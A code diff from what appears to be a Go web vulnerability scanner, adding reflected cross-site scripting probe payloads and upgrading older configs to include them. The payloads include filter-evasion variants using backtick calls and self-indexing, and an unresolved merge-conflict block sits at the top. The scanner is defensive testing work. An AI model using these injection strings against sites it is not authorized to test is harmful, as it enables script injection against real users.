@@ -16,7 +16,7 @@ import (
 )
 
 <<<<<<< HEAD
-const currentConfigVersion = 33
+const currentConfigVersion = 34
 =======
 const currentConfigVersion = 32
 >>>>>>> 7e660119acdb144ab49f86bcfe0d35e79c6f9929
@@ -583,6 +583,31 @@ func defaultPluginRules() map[string]PluginRuleConfig {
 		"csrf": {Payloads: []PayloadRule{{Name: "跨站 Origin", Kind: "origin", Payload: "https://jungle-happy-scan.invalid"}}},
 		"idor": {ParameterNames: []string{"id", "uid", "uuid", "user", "account", "order", "document", "record"}},
 	}
+	quickXSS := rules["reflected_xss"]
+	quickXSS.Payloads = append(quickXSS.Payloads,
+		PayloadRule{Name: "HTML IMG onerror", Kind: "html-text", Payload: `{{token}}<img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "HTML IMG onerror confirm", Kind: "html-text", Payload: `{{token}}<img src=x onerror=confirm(1)>`},
+		PayloadRule{Name: "HTML details ontoggle", Kind: "html-text", Payload: `{{token}}<details open ontoggle=confirm(1)>`},
+		PayloadRule{Name: "标签 IMG onerror", Kind: "tag", Payload: `{{token}}><img src=x onerror=alert(1)>`},
+	)
+	rules["reflected_xss"] = quickXSS
+	deepXSS := PluginRuleConfig{Payloads: append([]PayloadRule(nil), quickXSS.Payloads...)}
+	deepXSS.Payloads = append(deepXSS.Payloads,
+		PayloadRule{Name: "HTML IMG onerror 反引号自索引", Kind: "html-text", Payload: "{{token}}<img src=x onerror =\"self[0X10f8809.toString`36`]`1`\">"},
+		PayloadRule{Name: "HTML IMG 无空格属性", Kind: "html-text", Payload: `{{token}}<img/src=x/onerror=alert(1)>`},
+		PayloadRule{Name: "HTML VIDEO source onerror", Kind: "html-text", Payload: `{{token}}<video><source onerror=alert(1)>`},
+		PayloadRule{Name: "HTML IMG 反引号函数", Kind: "html-text", Payload: "{{token}}<img src=x onerror=x=alert,x`1`>"},
+		PayloadRule{Name: "HTML IMG Object.bind", Kind: "html-text", Payload: `{{token}}<img src=x onerror=Object.bind(null,alert)()(1)>`},
+		PayloadRule{Name: "HTML IMG Symbol.replace", Kind: "html-text", Payload: `{{token}}<img src=x onerror=/1/[Symbol.replace]('1',alert)>`},
+		PayloadRule{Name: "双引号属性 IMG onerror", Kind: "attribute-double", Payload: `{{token}}"><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "单引号属性 IMG onerror", Kind: "attribute-single", Payload: `{{token}}'><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "无引号属性 IMG onerror", Kind: "attribute-unquoted", Payload: `{{token}}><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "脚本单引号反引号函数", Kind: "script-single", Payload: "{{token}}';x=alert,x`1`;//"},
+		PayloadRule{Name: "脚本双引号反引号函数", Kind: "script-double", Payload: "{{token}}\";x=alert,x`1`;//"},
+		PayloadRule{Name: "脚本代码反引号函数", Kind: "script-code", Payload: "{{token}};x=alert,x`1`;//"},
+		PayloadRule{Name: "标签 IMG 反引号自索引", Kind: "tag", Payload: "{{token}}><img src=x onerror =\"self[0X10f8809.toString`36`]`1`\">"},
+	)
+	rules["reflected_xss_deep"] = deepXSS
 	sensitive := rules["sensitive_data"]
 	for i := range sensitive.Patterns {
 		sensitive.Patterns[i].Validator = legacyValidator(sensitive.Patterns[i].Name)
@@ -1083,6 +1108,11 @@ func upgradeConfig(cfg *Config) {
 		if cfg.ConfigVersion < 32 {
 			cfg.PluginRules["sqli_timing"] = mergePluginRuleDefaults(cfg.PluginRules["sqli_timing"], Default().PluginRules["sqli_timing"])
 		}
+		if cfg.ConfigVersion < 34 {
+			defaults := Default()
+			cfg.PluginRules["reflected_xss"] = mergePluginRuleDefaults(cfg.PluginRules["reflected_xss"], defaults.PluginRules["reflected_xss"])
+			cfg.PluginRules["reflected_xss_deep"] = mergePluginRuleDefaults(cfg.PluginRules["reflected_xss_deep"], defaults.PluginRules["reflected_xss_deep"])
+		}
 		upgradeV39(cfg)
 		cfg.ConfigVersion = currentConfigVersion
 		return
@@ -1304,6 +1334,7 @@ func upgradeConfig(cfg *Config) {
 		"sqli_extended", "sqli_timing", "sqli_order_by", "sqli_limit", "xxe_extended", "file_read_encoded", "file_upload_execution",
 		"command_injection_oast", "command_injection_timing", "java_expression_extended",
 		"mass_assignment_extended", "graphql_alias_abuse", "error_disclosure_extended",
+		"reflected_xss", "reflected_xss_deep",
 	} {
 		cfg.PluginRules[pluginID] = mergePluginRuleDefaults(cfg.PluginRules[pluginID], defaults.PluginRules[pluginID])
 	}
